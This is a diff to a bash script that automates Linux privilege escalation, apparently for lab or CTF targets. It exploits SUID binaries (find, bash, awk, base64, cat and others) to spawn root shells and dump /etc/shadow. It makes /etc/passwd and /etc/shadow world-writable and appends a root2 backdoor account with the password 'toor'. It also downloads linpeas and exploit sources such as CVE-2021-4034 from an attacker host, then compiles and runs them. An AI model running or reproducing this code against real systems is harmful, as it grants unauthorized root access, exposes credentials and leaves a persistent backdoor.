@@ -10,7 +10,7 @@ d=$(id)
 
 cd /tmp
 
-echo -e '\E[31;40m' "Script is not an end all be all, you may actually need to do some manual enumeration"; tput sgr0
+echo -e '\E[31;40m' "Script is not an end all be all, you may actually need to do some manual enumeration and exploitation"; tput sgr0
 echo -e '\E[32;40m'"Make sure linpeas is in the folder you have your web server on and is called linpeas.sh (ex: python3 -m http.server 8080)";tput sgr0
 echo -e '\E[31;40m' "Segmentation fault or critical error is ok... let the script continue running";tput sgr0
 sleep 2
@@ -20,9 +20,9 @@ echo -e '\E[31;40m' "Web server LPORT"; tput sgr0
 read LPORT
 
 echo -e '\E[32;40m' "Before Downloading linpeas looking for easy wins";tput sgr0
-echo -e '\E[31;40m' "Current user is $i within group $d" > info.txt
-echo -e '\E[31;40m' "Script last ran on $now" >> info.txt
-echo -e '\E[31;40m' "Looking at cronjobs";tput sgr0
+echo "Current user is $i within group $d" > info.txt
+echo "Script last ran on $now" >> info.txt
+echo '\E[31;40m' "Looking at cronjobs";tput sgr0
 cat /etc/crontab >> info.txt
 if grep "apt-get" info.txt; then
 	ls -la /etc/apt | grep apt.conf.d
@@ -45,49 +45,61 @@ fi
 
 echo -e '\E[31;40m' "Looking at SUID Bits"; tput sgr0
 echo -e '\E[31;40m' "Ran SUID bits with user $i on $now" >> info.txt; tput sgr0
-read -p "If any SUID bits found do you want to automatically exploit them for priv esc? (y/n)" answer
+read -p "If any SUID bits found do you want to automatically exploit them for priv esc? (y/n):" answer
 if [ $answer = n ] ; then
 	find / -perm -u=s -type f 2>/dev/null >> info.txt
 	echo '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
 else
 	find / -perm -u=s -type f 2>/dev/null >> info.txt
-	if grep '/usr/bin/find' info.txt; then
+	echo '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
+	echo '\E[32;40m' "This could take a while, script is not stuck"; tput sgr0
+	if grep "/usr/bin/find" info.txt; then
 		cd /usr/bin
 		./find . -exec /bin/bash -p \; -quit
 	elif grep "/usr/bin/bash" info.txt; then
 		cd /usr/bin
 		./bash -p
 	elif grep "/usr/bin/arp" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
 		cd /usr/bin
-		LFILE=/etc/shadow
 		./arp -v -f "$LFILE"
 	elif grep "/usr/bin/awk" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer 
 		cd /usr/bin
-		LFILE=/etc/shadow 
 		./awk '//' "$LFILE"
 	elif grep "/usr/bin/base32" info.txt ; then
-		LFILE=/etc/shadow
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
 		base32 "$LFILE" | base32 --decode
 	elif grep "/usr/bin/base64" info.txt ; then
-		LFILE=/etc/shadow
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
 		base64 "$LFILE" | base64 --decode
 	elif grep "/usr/bin/basenc" info.txt ; then
-		LFILE=/etc/shadow
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
 		basenc --base64 $LFILE | basenc -d --base64
 	elif grep "busybox" info.txt; then
 		cd /usr/bin
 		./busybox sh
 	elif grep "/usr/bin/cat" info.txt; then
-		LFILE=/etc/shadow
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
 		./cat "$LFILE"
 	elif grep "/usr/bin/chmod" info.txt ; then
 		cd /usr/bin
-		LFILE=/etc/shadow
-		./chmod 6777 $LFILE
-		echo "You can now add a user to /etc/shadow"
 		LFILE=/etc/passwd
 		./chmod 6777 $LFILE
-		echo "You can now add a user to /etc/passwd"
+		echo "User root2 added to /etc/passwd with password toor"
+		echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
+		LFILE=/etc/shadow
+		./chmod 6777 $LFILE
+		echo "User root2 added to /etc/shadow with password toor"
+		echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
+		echo '\E[31;40m' "Both passwd and shadow are now writeable, feel free to do what you will with it"; tput sgr0
 	elif grep "cpulimit" info.txt ; then
 		cd /usr/bin
 		./cpulimit -l 100 -f -- /bin/sh -p
@@ -122,24 +134,22 @@ else
 		./systemctl enable --now $TF
 	fi
 fi
-
+if [ "$(id -u)" = "0" ]; then
+   echo "You are root, have a nice day" 1>&2
+   exit 1
+else
+	echo "Not root yet, that sucks, lets keep going"
+fi
 if grep LEGEND lin.txt
 then
 	echo -e '\E[31;40m' "lin.txt already exists not running linpeas"; tput sgr0
 else
-	read -p "Do you have a server started on kali with linpeas in the folder? (y/n):" answer
-	if [ $answer = y ] ; then
-		cd /tmp
-		wget http://$LHOST:$LPORT/linpeas.sh
-		echo -e '\E[31;40m' "Running linpeas and saving to lin.txt this may take a few minutes";tput sgr0
-		echo -e '\E[31;40m' "Running linpeas with user $i on $now"
-		bash linpeas.sh > lin.txt
-	elif [ $answer = n ] ; then
-		echo -e '\E[31;40m' "Start listener";tput sgr0
-	else
-		echo -e '\E[31;40m' "What do you want from me?" ;tput sgr0
-	exit
-	fi
+	read -p "Press enter when web server (python3 -m http.server $LPORT) is started on kali machine? (y/n):" 
+	cd /tmp
+	wget http://$LHOST:$LPORT/linpeas.sh
+	echo -e '\E[31;40m' "Running linpeas and saving to lin.txt this may take a few minutes";tput sgr0
+	echo -e '\E[31;40m' "Running linpeas with user $i on $now"
+	bash linpeas.sh > lin.txt
 fi
 if grep CVE-2021-4034 lin.txt
 then
@@ -151,7 +161,7 @@ then
 	elif [ $answer = y ] ; then
 		echo -e '\E[32;40m' "Trying to download exploit from user machine" ;tput sgr0
 		echo -e '\E[31;40m' "Do a 'wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c' to local kali machine and make sure python server is still running" ;tput sgr0
-		read -p "Press enter when exploit is downloaded and python server is ready" ;tput sgr0
+		read -p "Press enter when exploit is downloaded and python server is ready on $LPORT"
 		wget http://$LHOST:$LPORT/cve-2021-4034-poc.c
 		gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
 		./cve-2021-4034-poc
@@ -178,7 +188,7 @@ then
 			./37292
 		else 
 			echo -e '\E[31;40m' "Do a 'searchsploit -m linux/local/39166.c' on kali machine and make sure python server is still running" ;tput sgr0
-			read -p "Press enter when exploit is downloaded and python server is ready" 
+			read -p "Press enter when exploit is downloaded and python server is ready on $LPORT" 
 			wget http://$LHOST:$LPORT/39166.c
 			gcc 39166.c -o 39166
 			./39166
